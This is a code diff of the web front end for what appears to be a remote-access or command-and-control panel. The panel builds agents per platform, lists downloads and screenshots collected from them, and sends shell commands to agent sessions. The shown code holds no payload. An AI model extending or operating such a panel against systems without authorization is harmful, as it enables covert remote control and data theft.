+        <div class="build-options">
+            <div class="option-group">
+                <label>Platform</label>
+                <select id="platform">
+                    <option value="windows">Windows</option>
+                    <option value="linux">Linux</option>
+                    <option value="macos">MacOS</option>
+                </select>
+            </div>
+            <div class="option-group">
+                <label>Architecture</label>
+                <select id="arch">
+                    <option value="x64">x64</option>
+                    <option value="x86">x86</option>
+                </select>
+            </div>
+            <button onclick="buildAgent()" class="build-button">
+                <span class="material-icons">build</span>
+                Build Agent
+            </button>
+        </div>
+        <div class="build-status"></div>
+    `;
+}
+
+// Storage Tab Functions
+function updateStorage() {
+    fetch('/api/storage')
+        .then(response => response.json())
+        .then(data => {
+            const storageContent = document.querySelector('.storage-content');
+            storageContent.innerHTML = `
+                <div class="storage-section">
+                    <h3>Downloads</h3>
+                    <div class="file-list" id="downloads-list"></div>
+                </div>
+                <div class="storage-section">
+                    <h3>Screenshots</h3>
+                    <div class="file-list" id="screenshots-list"></div>
+                </div>
+                <div class="upload-section">
+                    <input type="file" id="file-upload" hidden>
+                    <button onclick="document.getElementById('file-upload').click()">
+                        <span class="material-icons">upload_file</span>
+                        Upload File
+                    </button>
+                </div>
+            `;
+            updateFileList('downloads-list', data.downloads);
+            updateFileList('screenshots-list', data.screenshots);
+        });
+}
+
+// Helper Functions
+function isAgentActive(lastSeen) {
+    const lastSeenDate = new Date(lastSeen);
+    const now = new Date();
+    return (now - lastSeenDate) < 30000; // 30 seconds
+}
+
+function commandAgent(agentId) {
+    currentAgent = agentId;
+    document.querySelector('[data-tab="command"]').click();
+}
 
 function selectAgent(agentId) {
     currentAgent = agentId;
-    const terminal = document.querySelector('.agent-terminal');
-    const noAgentMessage = document.querySelector('.no-agent-selected');
-    
-    // Update UI
     document.querySelectorAll('.agent-card').forEach(card => {
         card.classList.toggle('active', card.getAttribute('data-id') == agentId);
     });
     
+    const terminal = document.querySelector('.agent-terminal');
+    const noAgentMessage = document.querySelector('.no-agent-selected');
+    
     terminal.style.display = 'flex';
     noAgentMessage.style.display = 'none';
-    
-    // Clear terminal output
-    document.getElementById('terminal-output').innerHTML = '';
-    
-    // Focus input
     document.getElementById('terminal-input').focus();
-}
-
-// Add command handling
-document.getElementById('terminal-input')?.addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') {
-        const command = this.value.trim();
-        if (!command) return;
-        
-        if (!currentAgent) {
-            appendToTerminal('No agent selected', 'error');
-            return;
-        }
-        
-        // Add command to history
-        commandHistory.unshift(command);
-        historyIndex = -1;
-        
-        // Show command in terminal
-        appendToTerminal(`$ ${command}`, 'command');
-        
-        // Send command to server
-        fetch('/api/send_command', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                session_id: currentAgent,
-                command: command
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.error) {
-                appendToTerminal(data.error, 'error');
-            } else {
-                appendToTerminal(data.output);
-            }
-        })
-        .catch(error => {
-            appendToTerminal(`Error: ${error.message}`, 'error');
-        });
-        
-        this.value = '';
-    }
-});
-
-function appendToTerminal(text, type = 'output') {
-    const terminal = document.getElementById('terminal-output');
-    const div = document.createElement('div');
-    div.className = `terminal-${type}`;
-    div.textContent = text;
-    terminal.appendChild(div);
-    terminal.scrollTop = terminal.scrollHeight;
-}
-
-// Update agent list periodically
-setInterval(updateAgentList, 7000); 
+} 
